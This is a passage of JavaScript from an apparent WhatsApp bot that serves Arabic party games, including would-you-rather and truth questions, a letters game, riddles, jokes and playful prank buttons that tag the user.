"لو خيروك |  بين وضع أحمر الشفاه على وجهك ما عدا شفتين أو وضع ماسكارا على شفتين فقط؟ ",
"لو خيروك |  بين الرقص على سطح منزلك أو الغناء على نافذتك؟ ",
"لو خيروك |  بين تلوين شعرك كل خصلة بلون وبين ارتداء ملابس غير متناسقة لمدة أسبوع؟ ",
"لو خيروك |  بين تناول مياه غازية مجمدة وبين تناولها ساخنة؟ ",
"لو خيروك |  بين تنظيف شعرك بسائل غسيل الأطباق وبين استخدام كريم الأساس لغسيل الأطباق؟ ",
"لو خيروك |  بين تزيين طبق السلطة بالبرتقال وبين إضافة البطاطا لطبق الفاكهة؟ ",
"لو خيروك |  بين اللعب مع الأطفال لمدة 7 ساعات أو الجلوس دون فعل أي شيء لمدة 24 ساعة؟ ",
"لو خيروك |  بين شرب كوب من الحليب أو شرب كوب من شراب عرق السوس؟ ",
"لو خيروك |  بين الشخص الذي تحبه وصديق الطفولة؟ ",
"لو خيروك |  بين أمك وأبيك؟ ",
"لو خيروك |  بين أختك وأخيك؟ ",
"لو خيروك |  بين نفسك وأمك؟ ",
"لو خيروك |  بين صديق قام بغدرك وعدوك؟ ",
"لو خيروك |  بين خسارة حبيبك/حبيبتك أو خسارة أخيك/أختك؟ ",
"لو خيروك |  بإنقاذ شخص واحد مع نفسك بين أمك أو ابنك؟ ",
"لو خيروك |  بين ابنك وابنتك؟ ",
"لو خيروك |  بين زوجتك وابنك/ابنتك؟ ",
"لو خيروك |  بين جدك أو جدتك؟ ",
"لو خيروك |  بين زميل ناجح وحده أو زميل يعمل كفريق؟ ",
"لو خيروك |  بين لاعب كرة قدم مشهور أو موسيقي مفضل بالنسبة لك؟ ",
"لو خيروك |  بين مصور فوتوغرافي جيد وبين مصور سيء ولكنه عبقري فوتوشوب؟ ",
"لو خيروك |  بين سائق سيارة يقودها ببطء وبين سائق يقودها بسرعة كبيرة؟ ",
"لو خيروك |  بين أستاذ اللغة العربية أو أستاذ الرياضيات؟ ",
"لو خيروك |  بين أخيك البعيد أو جارك القريب؟ ",
"لو خيروك |  يبن صديقك البعيد وبين زميلك القريب؟ ",
"لو خيروك |  بين رجل أعمال أو أمير؟ ",
"لو خيروك |  بين نجار أو حداد؟ ",
"لو خيروك |  بين طباخ أو خياط؟ ",
"لو خيروك |  بين أن تكون كل ملابس بمقاس واحد كبير الحجم أو أن تكون جميعها باللون الأصفر؟ ",
"لو خيروك |  بين أن تتكلم بالهمس فقط طوال الوقت أو أن تصرخ فقط طوال الوقت؟ ",
"لو خيروك |  بين أن تمتلك زر إيقاف موقت للوقت أو أن تمتلك أزرار للعودة والذهاب عبر الوقت؟ ",
"لو خيروك |  بين أن تعيش بدون موسيقى أبدًا أو أن تعيش بدون تلفاز أبدًا؟ ",
"لو خيروك |  بين أن تعرف متى سوف تموت أو أن تعرف كيف سوف تموت؟ ",
"لو خيروك |  بين العمل الذي تحلم به أو بين إيجاد شريك حياتك وحبك الحقيقي؟ ",
"لو خيروك |  بين معاركة دب أو بين مصارعة تمساح؟ ",
"لو خيروك |  بين إما الحصول على المال أو على المزيد من الوقت؟ ",
"لو خيروك |  بين امتلاك قدرة التحدث بكل لغات العالم أو التحدث إلى الحيوانات؟ ",
"لو خيروك |  بين أن تفوز في اليانصيب وبين أن تعيش مرة ثانية؟ ",
"لو خيروك |  بأن لا يحضر أحد إما لحفل زفافك أو إلى جنازتك؟ ",
"لو خيروك |  بين البقاء بدون هاتف لمدة شهر أو بدون إنترنت لمدة أسبوع؟ ",
"لو خيروك |  بين العمل لأيام أقل في الأسبوع مع زيادة ساعات العمل أو العمل لساعات أقل في اليوم مع أيام أكثر؟ ",
"لو خيروك |  بين مشاهدة الدراما في أيام السبعينيات أو مشاهدة الأعمال الدرامية للوقت الحالي؟ ",
"لو خيروك |  بين التحدث عن كل شيء يدور في عقلك وبين عدم التحدث إطلاقًا؟ ",
"لو خيروك |  بين مشاهدة فيلم بمفردك أو الذهاب إلى مطعم وتناول العشاء بمفردك؟ ",
"لو خيروك |  بين قراءة رواية مميزة فقط أو مشاهدتها بشكل فيلم بدون القدرة على قراءتها؟ ",
"لو خيروك |  بين أن تكون الشخص الأكثر شعبية في العمل أو المدرسة وبين أن تكون الشخص الأكثر ذكاءً؟ ",
"لو خيروك |  بين إجراء المكالمات الهاتفية فقط أو إرسال الرسائل النصية فقط؟ ",
"لو خيروك |  بين إنهاء الحروب في العالم أو إنهاء الجوع في العالم؟ ",
"لو خيروك |  بين تغيير لون عينيك أو لون شعرك؟ ",
"لو خيروك |  بين امتلاك كل عين لون وبين امتلاك نمش على خديك؟ ",
"لو خيروك |  بين الخروج بالمكياج بشكل مستمر وبين الحصول على بشرة صحية ولكن لا يمكن لك تطبيق أي نوع من المكياج؟ ",
"لو خيروك |  بين أن تصبحي عارضة أزياء وبين ميك آب أرتيست؟ ",
"لو خيروك |  بين مشاهدة كرة القدم أو متابعة الأخبار؟ ",
"لو خيروك |  بين موت شخصية بطل الدراما التي تتابعينها أو أن يبقى ولكن يكون العمل الدرامي سيء جدًا؟ ",
"لو خيروك |  بين العيش في دراما قد سبق وشاهدتها ماذا تختارين بين الكوميديا والتاريخي؟ ",
"لو خيروك |  بين امتلاك القدرة على تغيير لون شعرك متى تريدين وبين الحصول على مكياج من قبل خبير تجميل وذلك بشكل يومي؟ ",
"لو خيروك |  بين نشر تفاصيل حياتك المالية وبين نشر تفاصيل حياتك العاطفية؟ ",
"لو خيروك |  بين البكاء والحزن وبين اكتساب الوزن؟ ",
"لو خيروك |  بين تنظيف الأطباق كل يوم وبين تحضير الطعام؟ ",
"لو خيروك |  بين أن تتعطل سيارتك في نصف الطريق أو ألا تتمكنين من ركنها بطريقة صحيحة؟ ",
"لو خيروك |  بين إعادة كل الحقائب التي تملكينها أو إعادة الأحذية الجميلة الخاصة بك؟ ",
"لو خيروك |  بين قتل حشرة أو متابعة فيلم رعب؟ ",
"لو خيروك |  بين امتلاك قطة أو كلب؟ ",
"لو خيروك |  بين الصداقة والحب ",
"لو خيروك |  بين تناول الشوكولا التي تحبين طوال حياتك ولكن لا يمكنك الاستماع إلى الموسيقى وبين الاستماع إلى الموسيقى ولكن لا يمكن لك تناول الشوكولا أبدًا؟ ",
"لو خيروك |  بين مشاركة المنزل مع عائلة من الفئران أو عائلة من الأشخاص المزعجين الفضوليين الذين يتدخلون في كل كبيرة وصغيرة؟ "
]
    const xeonandav = andav[Math.floor(Math.random() * andav.length)]
    bufferandav = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttoandavns = [
        {buttonId: `andav`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttoandavns, image: bufferandav, caption: '*-›* '+ xeonandav }, {quoted:m})
    break
case 'حروف':case 'حرف':case 'الحروف': case 'anandavd':
    const anandavd =[
" جماد بحرف -> ر  ", 
" مدينة بحرف -> ع  ",
" حيوان ونبات بحرف -> خ  ", 
" اسم بحرف -> ح  ", 
" اسم ونبات بحرف -> م  ", 
" دولة عربية بحرف -> ق  ", 
" جماد بحرف -> ي  ", 
" نبات بحرف -> ج  ", 
" اسم بنت بحرف -> ع  ", 
" اسم ولد بحرف -> ع  ", 
" اسم بنت وولد بحرف -> ث  ", 
" جماد بحرف -> ج  ",
" حيوان بحرف -> ص  ",
" دولة بحرف -> س  ",
" نبات بحرف -> ج  ",
" مدينة بحرف -> ب  ",
" نبات بحرف -> ر  ",
" اسم بحرف -> ك  ",
" حيوان بحرف -> ظ  ",
" جماد بحرف -> ذ  ",
" مدينة بحرف -> و  ",
" اسم بحرف -> م  ",
" اسم بنت بحرف -> خ  ",
" اسم و نبات بحرف -> ر  ",
" نبات بحرف -> و  ",
" حيوان بحرف -> س  ",
" مدينة بحرف -> ك  ",
" اسم بنت بحرف -> ص  ",
" اسم ولد بحرف -> ق  ",
" نبات بحرف -> ز  ",
"  جماد بحرف -> ز  ",
"  مدينة بحرف -> ط  ",
"  جماد بحرف -> ن  ",
"  مدينة بحرف -> ف  ",
"  حيوان بحرف -> ض  ",
"  اسم بحرف -> ك  ",
"  نبات و حيوان و مدينة بحرف -> س  ", 
"  اسم بنت بحرف -> ج  ", 
"  مدينة بحرف -> ت  ", 
"  جماد بحرف -> ه  ", 
"  اسم بنت بحرف -> ر  ", 
" اسم ولد بحرف -> خ  ", 
" جماد بحرف -> ع  ",
" حيوان بحرف -> ح  ",
" نبات بحرف -> ف  ",
" اسم بنت بحرف -> غ  ",
" اسم ولد بحرف -> و  ",
" نبات بحرف -> ل  ",
"مدينة بحرف -> ع  ",
"دولة واسم بحرف -> ب  "
]
    const xeonanandavd = anandavd[Math.floor(Math.random() * anandavd.length)]
    bufferanandavd = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttoanandavdns = [
        {buttonId: `anandavd`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttoanandavdns, image: bufferanandavd, caption: '*◍* '+ xeonanandavd }, {quoted:m})
    break
    case 'صراحه':case 'جرأه':case 'صارحني': case 'anaanan':
    const anaanan =[
"هل تعرضت لغدر في حياتك؟",
"هل تعرف عيوبك؟",
"هل أنت مُسامح أم لا تستطيع أن تُسامح؟",
"إذا قمت بالسفر إلى نُزهة خارج بلدك فمن هو الشخص الذي تُحب أن يُرافقك؟هل تتدخل إذا وجدت شخص يتعرض لحادثة سير أم تتركه وترحل؟",
"ما هو الشخص الذي لا تستطيع أن ترفض له أي طلب؟",
"إذا أعجبت بشخصٍ ما، كيف تُظهر له هذا الإعجاب أو ما هي الطريقة التي ستتبعها لتظهر إعجابك به؟",
"هل ترى نفسك مُتناقضً؟",
"ما هو الموقف الذي تعرضت فيه إلى الاحراج المُبرح؟",
"ما هو الموقف الذي جعلك تبكي أمام مجموعة من الناس رغمًا عنك؟",
"إذا جاء شريك حياتك وطلب الانفصال، فماذا يكون ردك وقته؟",
"إذا كان والد يعمل بعملٍ فقير هل تقبل به أو تستعر منه؟",
"ما الذي يجعلك تُصاب بالغضب الشديد؟",
"هإذا وجدت الشخص الذي أحببتهُ في يومٍ ما يمسك بطفله، هل هذا سيشعرك بالألم؟",
"علاقتك مع اهلك",
"ثلاثة أشياء تحبها",
"صراحه  ›  صوتك حلوة؟",
"صراحه  ›  التقيت الناس مع وجوهين؟",
"صراحه  ›  شيء وكنت تحقق اللسان؟",
"صراحه  ›  أنا شخص ضعيف عندما؟",
"صراحه  ›  هل ترغب في إظهار حبك ومرفق لشخص أو رؤية هذا الضعف؟",
"صراحه  ›  يدل على أن الكذب مرات تكون ضرورية شي؟",
"صراحه  ›  أشعر بالوحدة على الرغم من أنني تحيط بك كثيرا؟",
"صراحه  ›  كيفية الكشف عن من يكمن عليك؟",
"صراحه  ›  إذا حاول شخص ما أن يكرهه أن يقترب منك ويهتم بك تعطيه فرصة؟",
"صراحه  ›  أشجع شيء حلو في حياتك؟",
"صراحه  ›  طريقة جيدة يقنع حتى لو كانت الفكرة خاطئة توافق؟",
"صراحه  ›  كيف تتصرف مع من يسيئون فهمك ويأخذ على ذهنه ثم ينتظر أن يرفض؟",
"صراحه  ›  التغيير العادي عندما يكون الشخص الذي يحبه؟",
"صراحه  ›  المواقف الصعبة تضعف لك ولا ترفع؟",
"صراحه  ›  نظرة و يفسد الصداقة؟",
"صراحه  ›  ‏‏إذا أحد قالك كلام سيء بالغالب وش تكون ردة فعلك؟",
"صراحه  ›  شخص معك بالحلوه والمُره؟",
"صراحه  ›  ‏هل تحب إظهار حبك وتعلقك بالشخص أم ترى ذلك ضعف؟",
"صراحه  ›  تأخذ بكلام اللي ينصحك ولا تسوي اللي تبي؟",
"صراحه  ›  وش تتمنى الناس تعرف عليك؟",
"صراحه  ›  ابيع المجرة عشان؟",
"صراحه  ›  أحيانا احس ان الناس ، كمل؟",
"صراحه  ›  مع مين ودك تنام اليوم؟",
"صراحه  ›  صدفة العمر الحلوة هي اني؟",
"صراحه  ›  الكُره العظيم دايم يجي بعد حُب قوي تتفق؟",
"صراحه  ›  صفة تحبها في نفسك؟",
"صراحه  ›  ‏الفقر فقر العقول ليس الجيوب  ، تتفق؟",
"صراحه  ›  تصلي صلواتك الخمس كلها؟",
"صراحه  ›  ‏تجامل أحد على راحتك؟",
"صراحه  ›  اشجع شيء سويتة بحياتك؟",
"صراحه  ›  وش ناوي تسوي اليوم؟",
"صراحه  ›  وش شعورك لما تشوف المطر؟",
"صراحه  ›  غيرتك هاديه ولا تسوي مشاكل؟",
"صراحه  ›  ما اكثر شي ندمن عليه؟",
"صراحه  ›  اي الدول تتمنى ان تزورها؟",
"صراحه  ›  متى اخر مره بكيت؟",
"صراحه  ›  تقيم حظك ؟ من عشره؟",
"صراحه  ›  هل تعتقد ان حظك سيئ؟",
"صراحه  ›  شـخــص تتمنــي الإنتقــام منـــه؟",
"صراحه  ›  كلمة تود سماعها كل يوم؟",
"صراحه  ›  **هل تُتقن عملك أم تشعر بالممل؟",
"صراحه  ›  هل قمت بانتحال أحد الشخصيات لتكذب على من حولك؟",
"صراحه  ›  متى آخر مرة قمت بعمل مُشكلة كبيرة وتسببت في خسائر؟",
"صراحه  ›  ما هو اسوأ خبر سمعته بحياتك؟",
"‏صراحه  › هل جرحت شخص تحبه من قبل ؟",
"صراحه  ›  ما هي العادة التي تُحب أن تبتعد عنها؟",
"‏صراحه  › هل تحب عائلتك ام تكرههم؟",
"‏صراحه  ›  من هو الشخص الذي يأتي في قلبك بعد الله – سبحانه وتعالى- ورسوله الكريم – صلى الله عليه وسلم؟",
"‏صراحه  ›  هل خجلت من نفسك من قبل؟",
"‏صراحه  ›  ما هو ا الحلم  الذي لم تستطيع ان تحققه؟",
"‏صراحه  ›  ما هو الشخص الذي تحلم به كل ليلة؟",
"‏صراحه  ›  هل تعرضت إلى موقف مُحرج جعلك تكره صاحبهُ؟",
"‏صراحه  ›  هل قمت بالبكاء أمام من تُحب؟",
"‏صراحه  ›  ماذا تختار حبيبك أم صديقك؟",
"‏صراحه  › هل حياتك سعيدة أم حزينة؟",
"صراحه  ›  ما هي أجمل سنة عشتها بحياتك؟",
"‏صراحه  ›  ما هو عمرك الحقيقي؟",
"‏صراحه  ›  ما اكثر شي ندمن عليه؟",
"صراحه  ›  ما هي أمنياتك المُستقبلية؟‏"
]
    const xeonanaanan = anaanan[Math.floor(Math.random() * anaanan.length)]
    bufferanaanan = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttoanaananns = [
        {buttonId: `anaanan`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttoanaananns, image: bufferanaanan, caption: '*◍* '+ xeonanaanan }, {quoted:m})
    break
    case 'مهنتي':case 'المهنه':case 'المهنة': case 'dwdweweas':
    const dwdweweas =[
"نقاش", "دكتور","دكتوره", "طيار ", "طياره", "مدرس ", "مدير", "مديره", "محاسب ", "محسابه", "نقاشه", "مدير بنك","مديرة بنك","وزير","وزيره","ظابط ","ظابطه","شيخه","شيخ"
]
    const xeondwdweweas = dwdweweas[Math.floor(Math.random() * dwdweweas.length)]
    bufferdwdweweas = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttodwdweweasns = [
        {buttonId: `dwdweweas`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttodwdweweasns, image: bufferdwdweweas, caption: '*◍ مهنتك ⇿* '+ xeondwdweweas }, {quoted:m})
    break
    case 'شخصيتي':case 'حدد شخصيتي':case 'الشخصية': case 'dwdws':
    const dwdws =[
    "عنيده", "متردده","خبيثة", "ايجابية ", "غامضة", "ضعيفة ", "كلاسيكية", "مسالمة", "حماسية ", "قيادية", "شكاك", "رومنسية","محفزة","متعاونة","اجتماعية","عصبية ","نرجسية","انطوائية","مظلومة"
    ]
    const xeondwdws = dwdws[Math.floor(Math.random() * dwdws.length)]
    bufferdwdws = await getBuffer(`https://telegra.ph/file/dc8e4edc7230cedbdec2c.jpg`)
    let buttodwdwsns = [
        {buttonId: `dwdws`, buttonText: {displayText: ' عقابات اخري  '}, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttodwdwsns, image: bufferdwdws, caption: ' *◍ شخصيتك 🥺♥️ ⇿* '+ xeondwdws }, {quoted:m})
    break
    case 'نمله': case 'نملة': case 'dwwdwewsaa':
    let me = m.sender    
    const dwwdwewsaa =[
"*◍ اضغط علي النملة ⏬*\n√",
"*◍ اضغط علي النملة ⏬*\n√"
]
    const xeondwwdwewsaa = dwwdwewsaa[Math.floor(Math.random() * dwwdwewsaa.length)]
    bufferdwwdwewsaa = await getBuffer(`https://telegra.ph/file/e6ccd926c8f244e7267dc.jpg`)
    let buttodwwdwewsaans = [
        {buttonId: `qdddwjdna`, buttonText: {displayText: '- 🐜 -' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttodwwdwewsaans, image: bufferdwwdwewsaa, caption: ''+ xeondwwdwewsaa }, {quoted:m})
    break
    case 'qdddwjdna': {
        let ownernya = ownernomer + '@s.whatsapp.net'
        let me = m.sender
        let timestampe = speed();
        let latensie = speed() - timestampe
        let xeonezy = `
*◍ الله لا يسامحك قتلتها🥺💔*

*◍ هو الكلب ده اللي موتها يجماعه😂👇*
        
*◍ اسمه :-* ${pushname} 

*◍ رقمه :-* @${me.split('@')[0]}
        
`
        let ments = [ownernya, me, ini_mark]        
        let buttons = [{buttonId: `bakar`, buttonText: {displayText: '  ◍ ههه بهزر معاك يقلبي😂♥️ '}, type: 1}]
        let buttonMessage = {
document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
fileName : `${wm}`,
mimetype: `${docs}`,
fileLength: '99999999999999',
pageCount: '1000000000',
caption: xeonezy,
footer: botname,
buttons: buttons,
mentions: ments,
headerType: 4,
}
XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break
case 'خنزير': case 'yttgtrtgd':    
    const yttgtrtgd =[
"*◍ إضغط علي خنزير 🐖 ⏬*\n√",
"*◍ إضغط علي خنزير 🐖 ⏬*\n√"
]
    const xeondyttgtrtgd = yttgtrtgd[Math.floor(Math.random() * yttgtrtgd.length)]
    bufferyttgtrtgd = await getBuffer(`https://telegra.ph/file/fb9e236d77e4743e744eb.jpg`)
    let buttontffdfdgh = [
        {buttonId: `dssdsddaxvgfg`, buttonText: {displayText: '- 🐷 -' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttontffdfdgh, image: bufferyttgtrtgd, caption: ''+ xeondyttgtrtgd }, {quoted:m})
    break

case 'dssdsddaxvgfg': {
        let ownernya = ownernomer + '@s.whatsapp.net'
        let me = m.sender
        let timestampe = speed();
        let latensie = speed() - timestampe
        let xeonezy = `

*◍ هو الخنزير اللى قتل اخوه يجماعه😂👇*
        
*◍ اسمه :-* ${pushname} 

*◍ رقمه :-* @${me.split('@')[0]}
        
`
        let ments = [ownernya, me, ini_mark]        
        let buttoonss = [{buttonId: `bakar`, buttonText: {displayText: '  ◍ ههه بهزر معاك يقلبي😂♥️ '}, type: 1}]
        let buttonMessage = {
document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
fileName : `${wm}`,
mimetype: `${docs}`,
fileLength: '99999999999999',
pageCount: '1000000000',
caption: xeonezy,
footer: botname,
buttons: buttoonss,
mentions: ments,
headerType: 4,
}
XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break

case 'صرصار': case 'srsarrrs':    
    const srsarrrs =[
"*◍ إضغط علي الصرصار 🦗 ⏬*\n√",
"*◍ إضغط علي الصرصار 🦗 ⏬*\n√"
]
    const xeondsrsarrrs = srsarrrs[Math.floor(Math.random() * srsarrrs.length)]
    buffersrsarrrs = await getBuffer(`https://telegra.ph/file/20931005cc47a1a80e61b.jpg`)
    let buttontffdgh = [
        {buttonId: `dsdddkjkj`, buttonText: {displayText: '- 🦗 -' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttontffdgh, image: buffersrsarrrs, caption: ''+ xeondsrsarrrs }, {quoted:m})
    break

case 'dsdddkjkj': {
        let ownernya = ownernomer + '@s.whatsapp.net'
        let me = m.sender
        let timestampe = speed();
        let latensie = speed() - timestampe
        let xeonezy = `

*◍ يـخربيـيـت آم دي عفآنـــه...😒😂😂*

*◍ هــو آلمـعفن آللى صـحـي آلصـرصـآر يـجمـآعــه😂👇*
        
*◍ اسمه :-* ${pushname} 

*◍ رقمه :-* @${me.split('@')[0]}
        
`
        let ments = [ownernya, me, ini_mark]        
        let buttoonss = [{buttonId: `bakar`, buttonText: {displayText: '  ◍ ههه بهزر معاك يقلبي😂♥️ '}, type: 1}]
        let buttonMessage = {
document: fs.readFileSync('./XeonMedia/theme/cheems.xlsx'),
fileName : `${wm}`,
mimetype: `${docs}`,
fileLength: '99999999999999',
pageCount: '1000000000',
caption: xeonezy,
footer: botname,
buttons: buttoonss,
mentions: ments,
headerType: 4,
}
XeonBotInc.sendMessage(m.chat, buttonMessage)
}
break

case 'المختلف': case 'مختلف': case 'mkhgyukjmg':    
    const mkhgyukjmg =[
"😹😹😹😹😹😹😹😹😸😹😹😹😹",
"💀💀💀💀💀💀💀☠️●💀💀💀💀",
"👻👻👻??👻👻👻👻👻👻👻",
"🕊🕊🕊🕊🐇🕊🕊🕊🕊",
"🌚🌚🌚🌚🌚🌑🌚🌚",
"🌑🌑🌑🌑🌑🌚🌑🌑🌑",
"🌟🌟🌟🌟🌟🌟🌟⭐️🌟🌟🌟",
"💫💫💫💫💫✨💫💫💫💫",
"🌨🌨🌨🌨⛈🌨🌨🌨🌨",
"⛅️⛅️⛅️⛅️⛅️⛅️🌥⛅️⛅️⛅️⛅️",
"☃️☃️☃️☃️☃️☃️⛄️☃️☃️☃️☃️",
"👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👩‍🔬👨‍🔬👩‍🔬👩‍🔬👩‍🔬",
"👩‍💻👨‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻👩‍💻",
"👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👩‍🔧👨‍🔧👩‍🔧👩‍🔧👩‍🔧",
"🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♂️🧚‍♀️🧚‍♂️🧚‍♂️",
"🧜‍♀️🧜‍♀️🧜‍♀️🧜‍♀️🧜‍♀️🧜‍♀️🧜‍♀️🧜‍♀️",
"🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️🧝‍♀️",
"🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙎‍♂️🙍‍♂️🙎‍♂️🙎‍♂️🙎‍♂️",
"🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♂️🧖‍♀️🧖‍♀️🧖‍♀️🧖‍♀️",
"👭👭👭👭👭👬👭👭",
"👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👦👨‍👨‍👧👨‍👨‍👦👨‍👨‍👦",
"🕒🕒🕒🕒🕒🕓🕒🕒🕒",
"🕥🕥🕥🕥🕤🕥🕥🕥",
"⏳⏳⏳⏳⏳⏳⌛️⏳⏳",
"📆📆📆📆📆📆📅📆📆"
]
    const xeondmkhgyukjmg = mkhgyukjmg[Math.floor(Math.random() * mkhgyukjmg.length)]
    buffermkhgyukjmg = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let buttontfdfdgh = [
        {buttonId: `mkhgyukjmg`, buttonText: {displayText: '⦁ لعب مرة اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttontfdfdgh, image: buffermkhgyukjmg, caption: '*◍ اسرع واحد يطلع المختلف . ↓*\n\n'+ xeondmkhgyukjmg }, {quoted:m})
    break

    case 'معاني': case 'المعاني': case 'mkhgy':    
    const mkhgy =[
"🐒",
"🐔",
"🐧",
"🐸",
"🦉",
"🐝",
"🐓",
"🐫",
"🐄",
"🐬",
"🐊",
"🦈",
"🐅",
"🐙",
"🦇",
"🦁",
"🐺",
"🦋",
"🦂",
"🦒",
"🦔",
"🍎"
]
    const xeondmkhgy = mkhgy[Math.floor(Math.random() * mkhgy.length)]
    buffermkhgy = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let buttoffefefs = [
        {buttonId: `mkhgy`, buttonText: {displayText: '⦁ لعب مرة اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: buttoffefefs, image: buffermkhgy, caption: '◍ اسرع واحد يقول اسم الاموشن »'+ xeondmkhgy }, {quoted:m})
    break
    case 'حزوره': case 'فزوره': case 'geggnvkk':    
    const geggnvkk =[
"شيئ اذا لمسته صرخ ما هوه ؟",
 "اخوان لا يستطيعان تمضيه اكثر من دقيقه معا فما هما ؟",
 "ما هو الحيوان الذي لم يصعد الى سفينة نوح عليه السلام ؟",
 "شيئ يسقط على رأسك من الاعلى ولا يجرحك فما هو ؟",
 "ما العدد الذي اذا ضربته بنفسه واضفت عليه 5 يصبح ثلاثين ",
 "ما الشيئ الذي له اوراق وليس له جذور ؟",
 "ما هو الشيئ الذي لا يمشي الا بالضرب ؟",
 "عائله مؤلفه من 6 بنات واخ لكل منهن .فكم عدد افراد العائله ",
"ما هو الشيئ الموجود وسط مكة ؟",
 "ابن امك وابن ابيك وليس باختك ولا باخيك فمن يكون ؟",
 "اخت خالك وليست خالتك من تكون ؟ ",
 "ما هو الشيئ الذي كلما خطا خطوه فقد شيئا من ذيله ؟ ",
 "ما هو الشيئ الذي يقول الصدق ولكنه اذا جاع كذب ؟",
 "كم مره ينطبق عقربا الساعه على بعضهما في اليوم الواحد ", 
  "ما هي الكلمه الوحيده التي تلفض غلط دائما ؟ ", 
  "ما هو السؤال الذي تختلف اجابته دائما ؟", 
 "جسم اسود وقلب ابيض وراس اخظر فما هو ؟", 
 "ماهو الشيئ الذي اسمه على لونه ؟", 
 "ارى كل شيئ من دون عيون من اكون ؟ ", 
 "ما هو الشيئ الذي يخترق الزجاج ولا يكسره ؟", 
  "ما هو الشيئ الذي يسير امامك ولا تراه ؟", 
  "ما هو الشيئ الذي يلاحقك اينما تذهب ؟ ", 
 "ما هو الشيء الذي كلما طال قصر ؟ ", 
 "ما هو الشيئ الذي يكتب ولا يقرأ ؟", 
 "له أسنان ولا يعض ما هو ؟ ", 
 "ما هو الشيئ اذا أخذنا منه ازداد وكبر ؟", 
 "ما هو الشيئ الذي يرفع اثقال ولا يقدر يرفع مسمار ؟", 
 "انا ابن الماء فان تركوني في الماء مت فمن انا ؟", 
  "كلي ثقوب ومع ذالك احفض الماء فمن اكون ؟",
  "اسير بلا رجلين ولا ادخل الا بالاذنين فمن انا ؟"
]
    const xeondgeggnvkk = geggnvkk[Math.floor(Math.random() * geggnvkk.length)]
    buffergeggnvkk = await getBuffer(`https://telegra.ph/file/7cabf05d1e7d5cde7d50b.mp4`)
    let bbgeggnvkk = [
        {buttonId: `geggnvkk`, buttonText: {displayText: '⦁ لعب مرة اخري' }, type: 1}
        ] 
    XeonBotInc.sendMessage(from, { buttons: bbgeggnvkk, image: buffergeggnvkk, caption: '◍ اسرع واحد يحل الفزوره . ↓\n\n» '+ xeondgeggnvkk }, {quoted:m})
    break
case 'نكتة': case 'عايزاضحك': case 'ضحكني': case 'نكته': case 'قولي_نكته': case 'kasawdfpo':    
    const kasawdfpo =[
" مرة واحد مصري دخل سوبر ماركت في الكويت عشان يشتري ولاعة..    راح عشان يحاسب بيقوله الولاعة ديه بكام؟   قاله دينار..  قاله منا عارف ان هي نار بس بكام ●😂", 
"بنت حبت تشتغل مع رئيس عصابة..   شغلها في غسيل الأموال ●😂 ", 
"واحد بيشتكي لصاحبه بيقوله أنا مافيش حد بيحبني ولا يفتكرني أبدًا، ومش عارف أعمل إيه.. قاله سهلة.. استلف من الناس فلوس هيسألوا عليك كل يوم! 🤓😂",
"ﻣﺮه واﺣﺪ ﻣﺴﻄﻮل ﻣﺎﺷﻰ ﻓﻰ اﻟﺸﺎرع ﻟﻘﻰ مذﻳﻌﻪ ﺑﺘﻘﻮﻟﻪ ﻟﻮ ﺳﻤﺤﺖ ﻓﻴﻦ اﻟﻘﻤﺮ؟    ﻗﺎﻟﻬﺎ اﻫﻮه..   ﻗﺎﻟﺘﻠﻮ ﻣﺒﺮوك ﻛﺴﺒﺖ ﻋﺸﺮﻳﻦ ﺟﻨﻴﻪ..   ﻗﺎﻟﻬﺎ ﻓﻰ واﺣﺪ ﺗﺎﻧﻰ ﻫﻨﺎك اﻫﻮه. 🤓😂",
"واحده ست سايقه على الجي بي اس..  قالها انحرفي قليلًا..   قلعت الطرحة. 🤓😂 ",
"مرة واحد غبي معاه عربية قديمة جدًا وبيحاول يبيعها وماحدش راضي يشتريها.. راح لصاحبه حكاله المشكلة.. صاحبه قاله عندي لك فكرة جهنمية هاتخليها تتباع الصبح.. أنت تجيب علامة مرسيدس وتحطها عليها. بعد أسبوعين صاحبه شافه صدفة قاله بعت العربية ولا لاء؟ قاله انت  مجنون؟ حد يبيع مرسيدس؟ 🤓😂",
"مره واحد بلديتنا كان بيدق مسمار فى الحائط فالمسمار وقع منه فقال له :تعالى ف مجاش, فقال له: تعالي ف مجاش. فراح بلديتنا رامي على المسمار شوية مسمامير وقال: هاتوه. 🤓😂",
